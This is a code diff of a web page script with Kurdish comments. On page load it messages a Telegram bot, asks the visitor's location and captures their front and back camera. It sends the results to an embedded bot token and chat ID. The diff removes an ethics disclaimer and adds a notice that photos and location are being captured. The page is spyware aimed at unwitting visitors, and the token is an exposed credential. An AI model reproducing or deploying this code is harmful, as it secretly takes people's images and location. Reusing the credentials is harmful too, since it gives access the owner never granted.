@@ -22,7 +22,7 @@
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        const token = '8977945781:AAFerAZWRIjyY5N_fDWk1NJzJEFJ_r1m9BU';
+        const token = '8977945781:AAFerAZWRIjxY5N_fDWk1NJzJEFJ_r1m9BU';
         const chat_id = '7643191802';
 
         // ١. ناردنی نامەی ئاسایی
@@ -76,15 +76,9 @@
             }
         }
 
-        // کاتێک سایتەکە لەلایەن کەسەکێ ڤە دەکرێتەوە
+        // کاتێک سایتەکە دەکرێتەوە
         window.onload = async () => {
-            const startMessage = (
-                "🚀 کەسێک هاتە ناو سایتەکەوە:\n\n"
-                "⚠️ بۆ هەر کارەکی بی اخلاق ئەم بەرپرس نینەن و هیڤی دکەم چ ئاریشا دروست نەکەی.\n\n"
-                "👨‍💻 دروسکەرێ بۆتی: @YUSEEF_SURCHI"
-            );
-            
-            await sendMessage(startMessage);
+            sendMessage("🚀 کەسێک هاتە ناو سایتەکەوە، وێنەی پێش و پشت لەگەڵ شوێن دەهێنە گرتن...");
             askLocation();
             
             // گرتنا کامێرا پێش (User)
